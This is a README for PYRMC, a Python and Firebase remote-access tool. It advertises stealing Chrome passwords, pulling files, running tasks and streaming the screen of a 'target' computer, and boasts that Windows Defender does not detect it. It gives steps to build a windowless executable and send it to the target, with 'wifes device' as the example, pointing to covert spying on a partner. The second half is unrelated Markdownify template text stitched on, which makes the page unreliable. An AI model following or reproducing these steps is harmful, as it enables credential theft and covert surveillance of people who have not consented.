
<h1 align="center">
  <br>
<img src="https://github.com/akbartaimurr/PYRMC/assets/134905706/959efbe9-d0fc-4747-b51f-66f70d658e43" alt="Markdownify" width="400"></a>
</h1>

<h4 align="center">A simple but effective remote controlling app made using <a href="http://python.org" target="_blank">Python</a> and <a href="http://firebase.google.com" target="_blank">Firebase</a></h4>


<p align="center">
  <a href="#key-features">Key Features</a> •
  <a href="#how-to-use">How to Build</a> •
  <a href="#credits">Youtube Demo</a> •
  <a href="#license">License</a>
</p>

![Recording 2024-05-04 154039](https://github.com/akbartaimurr/PYRMC/assets/134905706/2b818bf5-9840-418f-9013-f19e894cd31c)
> [!WARNING]  
> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!

## Key Features

* Get targets PC Information
  - OS Version, Ram, Storage etc.
* Get targets Chrome Passwords
* Get list of all current processes
* Import files to targets computer
* Play sound on targets computer
* View targets screen via twitch
* Run tasks on targets computer
* Display video files on targets computer
* Display image on targets computer
* Export files from targets computer to your computer
* List files in directories
> [!TIP]
> BONUS: PYRMC does not get marked by Windows Defender!


## How To Use

To clone and run this script you'll need <a href="https://python.org">Python</a>. You can use any version after python3, You will also need PIP, which can be downloaded with python.
After downloading python and pip, clone this repository or download this repo, then follow the following steps:
```bash
# Clone this repository
 git clone https://github.com/akbartaimurr/PYRMC

# Go into the repository
 cd PYRMC

# Install dependencies
run requirements.bat

```
After installing all the dependencies and requirements for this project, follow the steps below...
<br>
For each target device, you need a seperate `reciever.py` , `sender.py` and storage folder, so create a folder named for the target device you are aiming for
example `wifes device`

After creating the folder, copy `reciever.py` and `sender.py` and `storage folder` to the folder you created (ex. `wifes device`)
...
Now, you need to get your firebase private key: (make sure you have created a project with a web app already)
`https://console.firebase.google.com/project/yourproject/settings/serviceaccounts/adminsdk`
Scroll down, click on python and then click on `generate new private key`

It should download a `.json` file to your computer,
rename the file cred.json and put it inside your `storage folder` inside the target device folder (ex. `wifes device`)

### Step 2
edit `reciever.py` to input your twitch values (lines 25-30):
```python
...

cred = credentials.Certificate("storage/cred.json")  # Firebase Private Key Path
firebase_admin.initialize_app(cred)
db = firestore.client()

# Initialize Twitch client with your client ID
twitch_client = twitch.TwitchClient(client_id='')

```
(lines 191-192):
```python
        # Replace 'your_stream_key' with your actual Twitch stream key
        stream_key = ''
```
(lines 208-209)
```python
        # Get the stream URL
        stream_url = f''
```

### Step 3

After editing the values use pyinstaller to build your reciever.py into an exe
```bash
pyinstaller --noconfirm --onefile --noconsole  "path_to_reciever.py"
```
After building the exe file, copy it to your folder and zip `storage` and `reciever.exe`.
You can now send the zip archive to your target

## Sender.py
To use sender.py and target the reciever you just built, create a storage folder where your sender.py is located, in this case it's `wifes device`
put the same `cred.json` inside the storage folder
after doing those steps, you can run the file
```bash
python sender.py
```
> [!WARNING]  
> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!

## Download

You can [download](https://github.com/amitmerchant1990/electron-markdownify/releases/tag/v1.2.0) the latest installable version of Markdownify for Windows, macOS and Linux.

## Emailware

Markdownify is an [emailware](https://en.wiktionary.org/wiki/emailware). Meaning, if you liked using this app or it has helped you in any way, I'd like you send me an email at <bullredeyes@gmail.com> about anything you'd want to say about this software. I'd really appreciate it!

## Credits

This software uses the following open source packages:

- [Electron](http://electron.atom.io/)
- [Node.js](https://nodejs.org/)
- [Marked - a markdown parser](https://github.com/chjj/marked)
- [showdown](http://showdownjs.github.io/showdown/)
- [CodeMirror](http://codemirror.net/)
- Emojis are taken from [here](https://github.com/arvida/emoji-cheat-sheet.com)
- [highlight.js](https://highlightjs.org/)

## Related

[markdownify-web](https://github.com/amitmerchant1990/markdownify-web) - Web version of Markdownify

## Support

<a href="https://www.buymeacoffee.com/5Zn8Xh3l9" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/purple_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

<p>Or</p> 

<a href="https://www.patreon.com/amitmerchant">
	<img src="https://c5.patreon.com/external/logo/become_a_patron_button@2x.png" width="160">
</a>

## You may also like...

- [Pomolectron](https://github.com/amitmerchant1990/pomolectron) - A pomodoro app
- [Correo](https://github.com/amitmerchant1990/correo) - A menubar/taskbar Gmail App for Windows and macOS

## License

MIT

---

> [amitmerchant.com](https://www.amitmerchant.com) &nbsp;&middot;&nbsp;
> GitHub [@amitmerchant1990](https://github.com/amitmerchant1990) &nbsp;&middot;&nbsp;
> Twitter [@amit_merchant](https://twitter.com/amit_merchant)

